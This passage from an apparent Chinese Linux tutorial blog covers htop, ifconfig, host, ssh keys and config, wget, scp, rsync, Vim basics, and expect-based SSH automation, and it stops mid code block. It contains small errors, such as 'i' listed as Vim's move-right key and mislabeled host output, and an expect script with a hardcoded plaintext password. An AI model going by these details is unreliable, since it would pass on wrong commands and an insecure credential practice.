进入目录<br></code></pre></td></tr></table></figure><p><strong>3、配置</strong></p><p>执行 <code>./configure</code> ，它会分析你的电脑去确认编译所需的工具是否都已经安装了。</p><p><strong>4、编译</strong></p><p>执行 <code>make</code> 命令</p><p><strong>5、安装</strong></p><p>执行 <code>make install</code> 命令，安装完成后执行 <code>ls /usr/local/bin/</code> 查看是否有 <code>htop</code> 命令。如果有就可以执行 <code>htop</code> 命令查看系统进程了。</p><p><strong>网络</strong></p><p><strong>ifconfig</strong></p><p>查看 ip 网络相关信息，如果命令不存在的话， 执行命令 <code>yum install net-tools</code> 安装。</p><p>参数解析：</p><ul><li><code>eth0</code> 对应有线连接（对应你的有线网卡），就是用网线来连接的上网。<code>eth</code> 是 Ethernet 的缩写，表示“以太网”。有些电脑可能同时有好几条网线连着，例如服务器，那么除了<code>eth0</code> ，你还会看到 <code>eth1</code> 、<code>eth2</code> 等。 </li><li><code>lo</code> 表示本地回环（ Local Loopback 的缩写，对应一个虚拟网卡）可以看到它的 ip 地址是 127.0.0.1 。每台电脑都应该有这个接口，因为它对应着“连向自己的链接”。这也是被称之为“本地回环”的原因。所有经由这个接口发送的东西都会回到你自己的电脑。看起来好像并没有什么用，但有时为了某些缘故，我们需要连接自己。例如用来测试一个网络程序，但又不想让局域网或外网的用户查看，只能在此台主机上运行和查看所有的网络接口。例如在我们启动一个前端工程时，在浏览器输入 127.0.0.1:3000 启动项目就能查看到自己的 web 网站，并且它只有你能看到。 </li><li><code>wlan0</code> 表示无线局域网（上面案例并未展示）。 </li></ul><p><strong>host</strong></p><p>ip 地址和主机名的互相转换。</p><p><strong>软件安装</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> bind-utils<br></code></pre></td></tr></table></figure><p><strong>基础用法</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[root@lion ~]</span># host github.com<br>baidu.com has address <span class="hljs-number">13</span>.<span class="hljs-number">229</span>.<span class="hljs-number">188</span>.<span class="hljs-number">59</span><br> <br><span class="hljs-string">[root@lion ~]</span># host <span class="hljs-number">13</span>.<span class="hljs-number">229</span>.<span class="hljs-number">188</span>.<span class="hljs-number">59</span><br><span class="hljs-number">59.188.229.13</span>.in-addr.arpa domain name pointer ec2-<span class="hljs-number">13</span>-<span class="hljs-number">229</span>-<span class="hljs-number">188</span>-<span class="hljs-number">59</span>.ap-southeast-<span class="hljs-number">1</span>.compute.amazonaws.com.<br></code></pre></td></tr></table></figure><p><strong>ssh 连接远程服务器</strong></p><p>通过非对称加密以及对称加密的方式（同 HTTPS 安全连接原理相似）连接到远端服务器。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir">ssh 用户<span class="hljs-variable">@ip</span><span class="hljs-symbol">:port</span><br><br><span class="hljs-number">1</span>、ssh root<span class="hljs-variable">@172</span>.<span class="hljs-number">20.10</span>.<span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">22</span> <span class="hljs-comment"># 端口号可以省略不写，默认是22端口</span><br><span class="hljs-number">2</span>、输入连接密码后就可以操作远端服务器了<br></code></pre></td></tr></table></figure><p><strong>配置 ssh</strong></p><p><code>config</code> 文件可以配置 <code>ssh</code> ，方便批量管理多个 <code>ssh</code> 连接。</p><p>配置文件分为以下几种：</p><ul><li>全局 <code>ssh</code> 服务端的配置：<code>/etc/ssh/sshd_config</code> ； </li><li>全局 <code>ssh</code> 客户端的配置： <code>/etc/ssh/ssh_config</code>（很少修改）； </li><li>当前用户 <code>ssh</code> 客户端的配置：<code>~/.ssh/config</code> 。 </li></ul><p>【<strong>服务端</strong> <code>config</code> <strong>文件的常用配置参数</strong>】</p><table><thead><tr><th>服务端 config 参数</th><th>作用</th></tr></thead><tbody><tr><td>Port</td><td>sshd 服务端口号（默认是22）</td></tr><tr><td>PermitRootLogin</td><td>是否允许以 root 用户身份登录（默认是可以）</td></tr><tr><td>PasswordAuthentication</td><td>是否允许密码验证登录（默认是可以）</td></tr><tr><td>PubkeyAuthentication</td><td>是否允许公钥验证登录（默认是可以）</td></tr><tr><td>PermitEmptyPasswords</td><td>是否允许空密码登录（不安全，默认不可以）</td></tr></tbody></table><p>[<strong>注意</strong>] 修改完服务端配置文件需要重启服务 <code>systemctl restart sshd</code> </p><p>【客户端 <code>config</code> 文件的常用配置参数】</p><table><thead><tr><th>客户端 config 参数</th><th>作用</th></tr></thead><tbody><tr><td>Host</td><td>别名</td></tr><tr><td>HostName</td><td>远程主机名（或 IP 地址）</td></tr><tr><td>Port</td><td>连接到远程主机的端口</td></tr><tr><td>User</td><td>用户名</td></tr></tbody></table><p>配置当前用户的 <code>config</code> ：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-comment"># 创建config</span><br>vim ~/.ssh/config<br><br><span class="hljs-comment"># 填写一下内容</span><br>Host lion <span class="hljs-comment"># 别名</span><br>    HostName <span class="hljs-number">172</span>.x.x.x <span class="hljs-comment"># ip 地址</span><br>  Port <span class="hljs-number">22</span> <span class="hljs-comment"># 端口</span><br>  <span class="hljs-keyword">User</span> <span class="hljs-title">root</span> <span class="hljs-comment"># 用户</span><br></code></pre></td></tr></table></figure><p>这样配置完成后，下次登录时，可以这样登录 ssh lion 会自动识别为 root 用户。</p><p>[注意] 这段配置不是在服务器上，而是你自己的机器上，它仅仅是设置了一个别名。</p><p><strong>免密登录</strong></p><p><code>ssh</code> 登录分两种，一种是基于口令（账号密码），另外一种是基于密钥的方式。</p><p>基于口令，就是每次登录输入账号和密码，显然这样做是比较麻烦的，今天主要学习如何基于密钥实现免密登录。</p><p><strong>基于密钥验证原理</strong></p><p>客户机生成密钥对（公钥和私钥），把公钥上传到服务器，每次登录会与服务器的公钥进行比较，这种验证登录的方法更加安全，也被称为“公钥验证登录”。</p><p><strong>具体实现步骤</strong></p><p>1、在客户机中生成密钥对（公钥和私钥） <code>ssh-keygen</code>（默认使用 RSA 非对称加密算法）</p><p>运行完 <code>ssh-keygen</code> 会在 <code>~/.ssh/</code> 目录下，生成两个文件：</p><ul><li><code>id_rsa.pub</code> ：公钥 </li><li><code>id_rsa</code> ：私钥 </li></ul><p>2、把客户机的公钥传送到服务</p><p>执行 <code>ssh-copy-id root@172.x.x.x</code>（<code>ssh-copy-id</code> 它会把客户机的公钥追加到服务器 <code>~/.ssh/authorized_keys</code> 的文件中）。</p><p>执行完成后，运行 <code>ssh root@172.x.x.x</code> 就可以实现免密登录服务器了。</p><p>配合上面设置好的别名，直接执行 ssh lion 就可以登录，是不是非常方便。</p><p><strong>wget</strong></p><p>可以使我们直接从终端控制台下载文件，只需要给出文件的HTTP或FTP地址。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span><span class="hljs-meta"> [参数][URL地址]</span><br><br><span class="hljs-attribute">wget</span> http://www.minjieren.com/wordpress-<span class="hljs-number">3</span>.<span class="hljs-number">1</span>-zh_CN.zip<br></code></pre></td></tr></table></figure><p><code>wget</code> 非常稳定，如果是由于网络原因下载失败，<code>wget</code> 会不断尝试，直到整个文件下载完毕。</p><p><strong>常用参数</strong></p><ul><li><code>-c</code> 继续中断的下载。 </li></ul><p><strong>备份</strong></p><p><strong>scp</strong></p><p>它是 <code>Secure Copy</code> 的缩写，表示安全拷贝。<code>scp</code> 可以使我们通过网络，把文件从一台电脑拷贝到另一台电脑。</p><p><code>scp</code> 是基于 <code>ssh</code> 的原理来运作的，<code>ssh</code> 会在两台通过网络连接的电脑之间创建一条安全通信的管道，<code>scp</code> 就利用这条管道安全地拷贝文件。</p><p>其中<code>source_file</code> 和<code>destination_file</code> 都可以这样表示：<code>user@ip:file_name</code>，<code>user</code> 是登录名，ip是域名或ip地址。 <code>file_name</code> 是文件路径。</p><p><strong>rsync</strong></p><p><code>rsync</code> 命令主要用于远程同步文件。它可以同步两个目录，不管它们是否处于同一台电脑。它应该是最常用于“增量备份”的命令了。它就是智能版的 <code>scp</code> 命令。</p><p><strong>软件安装</strong></p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> rsync<br></code></pre></td></tr></table></figure><p><strong>基础用法</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">rsync -arv Images<span class="hljs-regexp">/ backups/</span> <span class="hljs-comment"># 将Images 目录下的所有文件备份到 backups 目录下</span><br>rsync -arv Images<span class="hljs-regexp">/ root@192.x.x.x:backups/</span> <span class="hljs-comment"># 同步到服务器的backups目录下</span><br></code></pre></td></tr></table></figure><p><strong>常用参数</strong></p><ul><li><code>-a</code> 保留文件的所有信息，包括权限，修改日期等； </li><li><code>-r</code> 递归调用，表示子目录的所有文件也都包括； </li><li><code>-v</code> 冗余模式，输出详细操作信息。 </li></ul><p>默认地，<code>rsync</code> 在同步时并不会删除目标目录的文件，例如你在源目录中删除一个文件，但是用 <code>rsync</code> 同步时，它并不会删除同步目录中的相同文件。如果向删除也可以这么做：<code>rsync -arv --delete Images/ backups/</code> 。</p><p><strong>系统</strong></p><p><strong>halt</strong></p><p>关闭系统，需要 root 身份。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">halt</span><br></code></pre></td></tr></table></figure><p><strong>reboot</strong></p><p>重启系统，需要 root 身份。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">reboot</span><br></code></pre></td></tr></table></figure><p><strong>poweroff</strong></p><p>直接运行即可关机，不需要 <code>root</code> 身份。</p><p>Vim 编译器</p><p><strong>Vim 是什么？</strong></p><p>Vim 是从 vi 发展出来的一个文本编辑器。其代码补完、编译及错误跳转等方便编程的功能特别丰富，在程序员中被广泛使用。和 Emacs 并列成为类 Unix 系统用户最喜欢的编辑器。</p><p><strong>Vim 常用模式</strong></p><ul><li><strong>交互模式</strong> </li><li><strong>插入模式</strong> </li><li><strong>命令模式</strong> </li><li><strong>可视模式</strong> </li></ul><p><strong>交互模式</strong></p><p>也成为正常模式，这是 Vim 的默认模式，每次运行 Vim 程序的时候，就会进入这个模式。</p><p>例如执行 <code>vim name.txt</code> 则会进入交互模式。</p><p>交互模式特征：</p><ul><li>在这个模式下，你不能输入文本； </li><li>它可以让我们在文本间移动，删除一行文本，复制黏贴文本，跳转到指定行，撤销操作，等等。 </li></ul><p><strong>插入模式</strong></p><p>这个模式是我们熟悉的文本编辑器的模式，就是可以输入任何你想输入的内容。进入这个模式有几种方法，最常用的方法是按字母键 i （ <code>i、I、a、A、o、O</code> 都可以进入插入模式，只是所处的位置不同），退出这种模式，只需要按下 Esc 键。</p><ul><li><code>i, I</code> 进入输入模式 Insert mode ：<code>i</code> 为“从目前光标所在处输入”， <code>I</code> 为“在目前所在行的第一个非空格符处开始输入”； </li><li><code>a, A</code> 进入输入模式 Insert mode ：<code>a</code> 为“从目前光标所在的下一个字符处开始输入”，<code>A</code> 为“从光标所在行的最后一个字符处开始输入”； </li><li><code>o, O</code> 进入输入模式 Insert mode ：<code>o</code> 为“在目前光标所在的下一行处输入新的一行”；<code>O</code> 为在目前光标所在处的上一行输入新的一行。 </li></ul><p><strong>命令模式</strong></p><p>命令模式也称为底线命令模式，这个模式下可以运行一些命令例如“退出”，“保存”，等动作。</p><p>也可以用这个模式来激活一些 Vim 配置，例如语法高亮，显示行号，等。甚至还可以发送一些命令给终端命令行，例如 <code>ls</code> 、<code>cp</code> 。</p><p>为了进入命令模式，首先要进入交互模式，再按下冒号键。</p><p>用一张图表示三种模式如何切换：</p><p><img src="640wx_fmt=jpeg&random=0.6678721195239334&random=0.jpeg" alt="图片"></p><p><strong>基本操作</strong></p><p><strong>打开 Vim</strong></p><p>在终端命令行中输入 vim 回车后 Vim 就会被运行起来，也可以用 Vim 来打开一个文件，只需要在 vim 后面再加文件名。如 <code>vim file.name</code> ，如果文件不存在，那么会被创建。</p><p><strong>插入</strong></p><p>进入文件之后，此时处于交互模式，可以通过输入 i 进入插入模式。</p><p><strong>移动</strong></p><p>在 Vim 的交互模式下，我们可以在文本中移动光标。</p><ul><li>h 向左移动一个字符 </li><li>j 向下移动一个字符 </li><li>k 向上移动一个字符 </li><li>i 向右移动一个字符 </li></ul><p>当然也可以使用四个方向键进行移动，效果是一样的。</p><p><strong>跳至行首和行末</strong></p><ul><li><strong>行首</strong>：在交互模式下，为了将光标定位到一行的开始位置，只需要按下数字键 0 即可，键盘上的 Home 键也有相同效果。 </li><li><strong>行末</strong>：在交互模式下，为了将光标定位到一行的末尾，只需要按下美元符号键 <code>$</code> 即可，键盘上的 End 键也有相同效果。 </li></ul><p><strong>按单词移动</strong></p><p>在交互模式下，按字母键 <code>w</code> 可以一个单词一个单词的移动。</p><p><strong>退出文件</strong></p><p>在交互模式下，按下冒号键 : 进入命令模式，再按下 <code>q</code> 键，就可以退出了。</p><p>如果在退出之前又修改了文件，就直接想用 <code>:q</code> 退出 Vim ，那么 Vim 会显示一个红字标明错误信息。此时我们有两个选择：</p><ol><li>保存并退出 <code>:wq</code> 或 <code>:x</code> ； </li><li>不保存且退出  <code>:q!</code> 。 </li></ol><p><strong>标准操作</strong></p><p><strong>删除字符</strong></p><p>在交互模式下，将光标定位到一个你想要删除的字符上，按下字母键 x 你会发现这个字符被删除了。</p><p>也可以一次性删除多个字符，只需要在按 x 键之前输入数字即可。</p><p><strong>删除（剪切）单词，行</strong></p><ul><li>删除一行：连按两次 <code>d</code> 来删除光标所在的那一行。 </li><li>删除多行：例如先输入数字 2 ，再按下 <code>dd</code> ，就会删除从光标所在行开始的两行。 </li><li>删除一个单词：将光标置于一个单词的首字母处，然后按下 <code>dw</code> 。 </li><li>删除多个单词：例如先按数字键 2 再按 <code>dw</code> 就可以删除两个单词了。 </li><li>从光标所在位置删除至行首： <code>d0</code> 。 </li><li>从光标所在位置删除至行末： <code>d$</code> 。 </li></ul><p><strong>复制单词，行</strong></p><ul><li><strong>复制行</strong>：按两次 <code>y</code> 会把光标所在行复制到内存中，和 <strong><code>dd</code></strong> 类似，<code>dd</code> 用于“剪切”光标所在行。 </li><li><strong>复制单词</strong>：<code>yw</code> 会复制一个单词。 </li><li><strong>复制到行末</strong>：<code>y$</code> 是复制从光标所在处到行末的所有字符。 </li><li><strong>复制到行首</strong>：<code>y0</code> 是复制光标所在处到行首的所有字符。 </li></ul><p><strong>粘贴</strong></p><p>如果之前用 <code>dd</code> 或者 <code>yy</code> 剪切复制过来的，可以使用 <code>p</code> 来粘贴。同样也可以使用 <code>数字+p</code> 来表示复制多次。</p><p><strong>替换一个字符</strong></p><p>在交互模式下，将光标置于想要替换的字符上。按下 <code>r</code> 键，接着输入你要替换的字符即可。</p><p><strong>撤销操作</strong></p><p>如果要撤销最近的修改，只需要按下 <code>u</code> 键，如果想要撤销最近四次修改，可以按下4，再按下 <code>u</code> 。</p><p><strong>重做</strong></p><p>取消撤销，也就是重做之前的修改使用 <code>ctrl + r</code> 。</p><p>跳转到指定行</p><p>Vim 编辑的文件中，每一行都有一个行号，行号从1开始，逐一递增。</p><p>行号默认是不显示，如果需要它显示的话，可以进入命令模式，然后输入 <code>set nu</code> ，如果要隐藏行号的话，使用 <code>set nonu</code> 。</p><ul><li>跳转到指定行：<code>数字+gg</code> ，例如 <code>7gg</code> ，表示跳转到第7行。 </li><li>要跳转到最后一行，按下 <code>G</code> 。 </li><li>要跳转到第一行，按下 <code>gg</code> 。 </li></ul><p><strong>高级操作</strong></p><p><strong>查找</strong></p><p>处于交互模式下，按下 <code>/</code> 键，那么就进入查找模式，输入你要查找的字符串，然后按下回车。光标就会跳转到文件中下一个查找到的匹配处。如果字符串不存在，那么会显示 <code>&quot;pattern not found&quot;</code> 。</p><ul><li><code>n</code> 跳转到下一个匹配项； </li><li><code>N</code> 跳转到上一个匹配项。 </li></ul><p>[<strong>注意</strong>] 用斜杠来进行的查找是从当前光标处开始向文件尾搜索，如果你要从当前光标处开始，向文件头搜索则使用 <code>?</code> ，当然也可以先按下 <code>gg</code> 跳转到第一行在进行全文搜索。</p><p><strong>查找并替换</strong></p><p>替换光标所在行第一个匹配的字符串：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 语法</span><br><span class="hljs-symbol">:s/</span>旧字符串/新字符串<br><br><span class="hljs-comment"># 实例</span><br><span class="hljs-symbol">:s/one/two</span><br></code></pre></td></tr></table></figure><p>替换光标所在行所有旧字符串为新字符串：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 语法</span><br>:s<span class="hljs-regexp">/旧字符串/</span>新字符串/g<br></code></pre></td></tr></table></figure><p>替换第几行到第几行中所有字符串：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 语法</span><br>:n,m s<span class="hljs-regexp">/旧字符串/</span>新字符串/g<br><br><span class="hljs-comment"># 实例</span><br>:<span class="hljs-number">2</span>,<span class="hljs-number">4</span> s<span class="hljs-regexp">/one/</span>two/g<br></code></pre></td></tr></table></figure><p>最常用的就是全文替换了：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-comment"># 语法</span><br><span class="hljs-symbol">:%s/</span>旧字符串/新字符串/g<br></code></pre></td></tr></table></figure><p><strong>合并文件</strong></p><p>可以用冒号 <code>+r</code> ( <code>:r</code> ) 实现在光标处插入一个文件的内容。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">:r</span> filename <span class="hljs-comment"># 可以用Tab键来自动补全另外一个文件的路径</span><br></code></pre></td></tr></table></figure><p><strong>分屏</strong></p><p>Vim 有一个特别便捷的功能那就是分屏，可以同时打开好几个文件，分屏之后，屏幕每一块被称为一个 viewport ，表示“视口”。</p><ul><li><strong>横向分屏</strong> : sp 文件名 </li><li><strong>垂直分屏</strong> : vsp 文件名 </li></ul><p><strong>分屏模式下的快捷键</strong></p><ul><li><code>Ctrl + w</code> 再加 <code>Ctrl + w</code> ，表示从一个 viewport 移动光标到另外一个 viewport ； </li><li><code>Ctrl + w</code> 再加 “方向键”，就可以移动到这个方向所处的下一个视口了； </li><li><code>Ctrl + w</code> 再加 <code>+</code> 号，表示扩大当前视口； </li><li><code>Ctrl + w</code> 再加 <code>-</code> 号，表示缩小当前视口； </li><li><code>Ctrl + w</code> 再加 <code>=</code> 号，表示平均当前视口； </li><li><code>Ctrl + w</code> 再加 <code>r</code> 键，会反向调换视口位置； </li><li><code>Ctrl + w</code> 再加 <code>q</code> 键，会关闭当前视口； </li><li><code>Ctrl + w</code> 再加 <code>o</code> 键，会关闭除当前视口以外的所有视口； </li></ul><p><strong>运行外部命令</strong> <code>:!</code></p><p>在 Vim 中可以运行一些终端命令，只要先输入 :! ，然后接命令名称。</p><p>例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:!<span class="hljs-built_in">ls</span> <span class="hljs-comment"># 在Vim中打开的文件所在的目录运行ls命令</span><br></code></pre></td></tr></table></figure><p><strong>可视模式</strong></p><p>前面只讲了 Vim 的三种模式，其实还有一种模式叫做可视模式。</p><p>进入它的三种方式（都是从交互模式开始）：</p><ul><li><code>v</code> 字符可视模式，进入后配合方向键选中字符后，然后再按 <code>d</code> 键可以删除选中。 </li><li><code>V</code> 行可视模式，进入后光标所在行默认被选中，然后再按 <code>d</code> 键可以删除所在行。 </li><li><code>Ctrl + v</code> 块可视模式，它是可视模式最有用的功能了，配合 <code>d</code> 和 <code>I</code> 键可以实现删除选中的内容和插入内容。 </li></ul><p>同时选中多行，并在选中行头部插入内容的具体操作步骤：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> ctrl + v 进入块可视模式<br><span class="hljs-bullet">2.</span> 使用方向键进行选中（上下左右）假设选中5行<br><span class="hljs-bullet">3.</span> 输入 I 键进行多行同时插入操作<br><span class="hljs-bullet">4.</span> 插入完成后连续按两下 esc 键，实现多行同时插入相同字符<br></code></pre></td></tr></table></figure><p>进入可视模式之后的操作键：</p><ul><li><code>d</code> 键，表示删除选中； </li><li><code>I</code> 键，表示在选中之前插入； </li><li><code>u</code> 键，表示选中变为小写； </li><li><code>U</code> 键，表示选中变为大写； </li></ul><p><strong>Vim 配置</strong></p><p><strong>选项参数</strong></p><p>在 Vim 被启动后，可以运行一些指令来激活一些选项参数，但是这些选项参数的配置在退出 Vim 时会被忘记，例如前面讲解的激活行号。如果希望所在的配置是永久性的，那么需要在家目录（ <code>cd ~</code> ）创建一个 Vim 的配置文件 <code>.vimrc</code> 。</p><p><strong>.vimrc</strong></p><p>Vim 配置非常丰富，我们可以通过个性化配置把 Vim 打造成属于自己的 IDE 等等。在 github 上也可以搜索到一些强大的 Vim 配置文件。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux文件的定期备份，异常备份，删除备份</title>
    <link href="/2023/07/26/linux%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%9A%E6%9C%9F%E5%A4%87%E4%BB%BD%EF%BC%8C%E5%BC%82%E5%B8%B8%E5%A4%87%E4%BB%BD%EF%BC%8C%E5%88%A0%E9%99%A4%E5%A4%87%E4%BB%BD/"/>
    <url>/2023/07/26/linux%E6%96%87%E4%BB%B6%E7%9A%84%E5%AE%9A%E6%9C%9F%E5%A4%87%E4%BB%BD%EF%BC%8C%E5%BC%82%E5%B8%B8%E5%A4%87%E4%BB%BD%EF%BC%8C%E5%88%A0%E9%99%A4%E5%A4%87%E4%BB%BD/</url>
    
    <content type="html"><![CDATA[<p><strong>一.背景</strong><br>1.总会出现环境上的数据丢失，在没有备份的情况下会非常的被动，不管是由于病毒还是人为的原因造成的程序、数据被删除，有时候后悔已经来不及，不如提前做到数据的备份，而异地备份也更加的保险一点。<br>2.数据备份的意义就在于，当受到网络攻击、入侵、电源故障或者操作失误等事故的发生后，可以完整、快速、简捷、可靠地恢复原有系统，在一定的范围内保障系统的正常运行。</p><p><strong>二.依赖功能介绍</strong><br><strong>1.expect</strong><br>作用：expect工具是一个根据脚本与其他交互式程序进行交互<br>安装语句:yum install expect<br>下面是安装教程：</p><p><strong>一、expect安装介绍</strong><br><strong>1.expect命令安装：</strong><br>安装语句:yum install expect<br><strong>2.expect命令含义：</strong></p><p> expect是一种脚本语言，它能够代替人工实现与终端的交互，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。</p><p><strong>3.expect使用场景：</strong></p><p>（1）并根据预定标准回答其问题，回答“是”、“否”或将控制权交还给您</p><p>（2）远程连接设备并执行自动化操作</p><p>（3）主要是一些需要人机交互的地方，如果提前知道应该输入什么指令都可以使用expect 工具</p><p><strong>二、expect使用原理</strong></p><p><strong>1.原理介绍：</strong></p><p><code>spawn</code>启动指定进程—<code>expect</code>获取指定关键字—<code>send</code>向指定程序发送指定字符—执行完成退出</p><p><strong>2、spawn命令介绍：</strong></p><p>spawm命令就是用来启动新的进程的。spawn后的send和expect命令都是和spawn打开的进程进行交互的、</p><p><strong>3、send命令介绍：</strong></p><p>send命令接收一个字符串参数，并将该参数发送到进程，这个过程类似模拟人类输入密码</p><p><strong>4、interact命令介绍：</strong></p><p>结合spawn、expect、send自动化的完成很多任务，interact命令可以在适当的时候进行任务的干预，比如下载完ftp文件时，仍然可以停留在ftp命令行状态，以便手动的执行后续命令</p><p> <strong>三、expect使用语法</strong></p><p><strong>1. expect 启用选项：</strong></p><p>-c 执行脚本前先执行的命令，可多次使用<br>-d debug模式，可以在运行时输出一些诊断信息，与在脚本开始处使用exp_internal 1相似。<br>-D 启用交换调式器,可设一整数参数。<br>-f 从文件读取命令，仅用于使用#!时。如果文件名为”-“，则从stdin读取(使用”./-“从文件名为-的文件读取)。<br>-i 交互式输入命令，使用”exit”或”EOF”退出输入状态<br>– 标示选项结束(如果你需要传递与expect选项相似的参数给脚本时)，可放到#!行:#!/usr/bin/expect –<br>-v 显示expect版本信息<br><strong>2.expect命令参数：</strong></p><p>spawn 交互程序开始，执行后面的命令或程序。需要进入到expect环境才可以执行，不能直接在shell环境下直接执行<br>set timeout n 设置超时时间，表示该脚本代码需在n秒钟内完成，如果超过，则退出。用来防止ssh远程主机网络不可达时卡住及在远程主机执行命令宕住。如果设置为-1表示不会超时<br>set 定义变量<br>$argv expect脚本可以接受bash的外部传参，可以使用[ lindex $argv n ]n为0表示第一个传参，为1表示第二个传参，以此类推<br>expect 从交互程序进程中指定接收信息, 如果匹配成功, 就执行send的指令交互；否则等待timeout秒后自动退出expect语句<br>send 如果匹配到expect接受到的信息，就将send中的指令交互传递，执行交互动作。结尾处加上\r表示如果出现异常等待的状态可以进行核查<br>exp_continue 表示循环式匹配，通常匹配之后都会退出语句，但如果有exp_continue则可以不断循环匹配，输入多条命令，简化写法。<br>exit 退出expect脚本<br>expect eof spawn进程结束后会向expect发送eof，接收到eof代表该进程结束<br>interact 执行完代码后保持交互状态，将控制权交给用户。没有该命令执行完后自动退出而不是留在远程终端上<br>puts 输出变量</p><p><strong>四、expect使用举例</strong></p><p> **1.expect脚本实现ssh自动登录远程服务<br>**</p><figure class="highlight d"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><pre><code class="hljs d"><span class="hljs-meta">#!/usr/bin/expect</span><br>spawn ssh mrswhite@<span class="hljs-number">192.168</span><span class="hljs-number">.37</span><span class="hljs-number">.9</span><br>expect <span class="hljs-string">&quot;*password:&quot;</span><br>send <span class="hljs-string">&quot;test20221007\r&quot;</span><br>expect <span class="hljs-string">&quot;*#&quot;</span><br>interact<br></code></pre></td></tr></table></figure><p>expect expect_demo1.sh 执行查看运行结果:</p><p><img src="640.png" alt="图片"></p><p>**2.expect脚本实现ssh自动登录远程服务器（通用脚本，手动输入**参数**）<br>**</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-comment">#!/usr/bin/expect</span><br><span class="hljs-keyword">if</span> &#123;<span class="hljs-variable">$argc</span> &lt; <span class="hljs-number">3</span>&#125; &#123;    <br><span class="hljs-keyword">puts</span> <span class="hljs-string">&quot;Usage:cmd &lt;host&gt; &lt;username&gt; &lt;password&gt;&quot;</span><br><span class="hljs-keyword">exit</span> <span class="hljs-number">1</span><br><br>&#125;<br><span class="hljs-keyword">set</span> timeout <span class="hljs-number">-1</span><br><span class="hljs-keyword">set</span> host [ <span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">0</span> ]<br><span class="hljs-keyword">set</span> username [ <span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">1</span> ]<br><span class="hljs-keyword">set</span> password [ <span class="hljs-keyword">lindex</span> <span class="hljs-variable">$argv</span> <span class="hljs-number">2</span> ]<br><br>spawn ssh  <span class="hljs-variable">$username</span>@<span class="hljs-variable">$host</span><br>expect <span class="hljs-string">&quot;*password*&quot;</span> &#123;send <span class="hljs-string">&quot;$password\r&quot;</span>&#125;<br>interact<br></code></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">./expect_demo2.sh <span class="hljs-number">192.168.37.9</span> mrswhite  test<span class="hljs-number">20221007</span><br></code></pre></td></tr></table></figure><p> 执行查看运行结果:</p><p><img src="640-1690382166396-3.png" alt="图片"></p><p> <strong>3.在shell 中嵌套expect</strong></p><p> 通过expect嵌套shell使用语句在shell内直接执行，任何这样可以实现更多的功能</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 